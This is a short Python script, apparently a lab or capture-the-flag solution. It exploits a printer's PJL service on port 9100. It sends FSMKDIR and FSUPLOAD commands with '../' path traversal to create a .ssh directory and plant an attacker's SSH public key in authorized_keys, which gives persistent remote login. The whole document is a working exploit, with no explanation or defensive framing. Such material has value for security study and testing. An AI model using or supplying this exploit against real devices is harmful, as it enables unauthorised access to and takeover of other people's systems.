#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"


def send(cmd: bytes, extra: bytes = b"", timeout: float = 3.0) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(cmd + extra)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b"TIMEOUT"
    finally:
        s.close()


n = len(KEY)
steps = [
    ("mkdir", b'@PJL FSMKDIR NAME="../.ssh"\r\n'),
    ("upload", f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\nSIZE={n}\r\n'.encode(), KEY),
]
for item in steps:
    if len(item) == 2:
        label, cmd = item
        print(label, repr(send(cmd)))
    else:
        label, cmd, body = item
        print(label, repr(send(cmd, body, timeout=5)))